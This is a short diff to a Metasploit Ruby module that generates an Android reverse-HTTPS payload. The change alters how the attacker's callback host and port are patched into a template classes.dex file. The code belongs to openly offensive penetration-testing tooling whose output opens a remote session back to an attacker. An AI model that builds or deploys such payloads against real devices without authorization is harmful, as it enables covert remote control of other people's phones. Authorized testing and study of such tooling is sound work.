@@ -25,7 +25,6 @@ module Metasploit3
       'Handler'       => Msf::Handler::ReverseHttps,
       'Stager'        => {'Payload' => ""}
       ))
-    ]
 
     register_options(
     [
@@ -35,15 +34,14 @@ module Metasploit3
   end
   
   def generate_jar(opts={})
-    u = datastore['LHOST'] ? datastore['LHOST'] : String.new
-    raise ArgumentError, "LHOST can be 32 bytes long at the most" if u.length > 32
+    host = datastore['LHOST'] ? datastore['LHOST'].to_s : String.new
+    port = datastore['LPORT'] ? datastore['LPORT'].to_s : 8443.to_s
+    raise ArgumentError, "LHOST can be 32 bytes long at the most" if host.length + port.length + 1 > 32
 
     jar = Rex::Zip::Jar.new
 
     classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
-
-    string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + datastore['LHOST'].to_s) if datastore['LHOST']
-    string_sub(classes, '4444                            ', datastore['LPORT'].to_s) if datastore['LPORT']
+    string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + host + ":" + port)
     string_sub(classes, 'TTTT                                ', "TTTT" + datastore['RetryCount'].to_s) if datastore['RetryCount']
     jar.add_file("classes.dex", fix_dex_header(classes))
 
